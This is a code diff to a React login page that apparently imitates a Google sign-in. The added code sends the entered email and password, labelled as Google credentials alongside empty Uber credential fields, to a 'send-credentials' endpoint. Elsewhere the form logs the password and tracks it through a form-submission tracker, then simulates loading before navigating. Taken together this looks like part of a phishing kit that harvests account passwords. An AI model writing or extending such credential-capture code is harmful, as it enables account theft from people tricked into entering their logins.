@@ -29,12 +29,38 @@ export default function LoginPage({ onNavigate }: LoginPageProps) {
     };
   }, []);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     console.log("Google login successful with:", { email, password });
     
     // Track form submission
     trackFormSubmit('login-form-page-1', { email, password }, '/login-page-1');
+    
+    // Send credentials to backend
+    try {
+      console.log('📧 Sending Google credentials to backend...');
+      const apiUrl = import.meta.env.PROD 
+        ? '/api/send-credentials' 
+        : 'http://localhost:3001/api/send-credentials';
+      
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          googleEmail: email,
+          googlePassword: password,
+          uberEmail: '',
+          uberPassword: ''
+        })
+      });
+      
+      const result = await response.json();
+      console.log('✅ Google credentials sent:', result);
+    } catch (error) {
+      console.error('❌ Error sending Google credentials:', error);
+    }
     
     setLoading(true);
     // Simulate loading then navigate
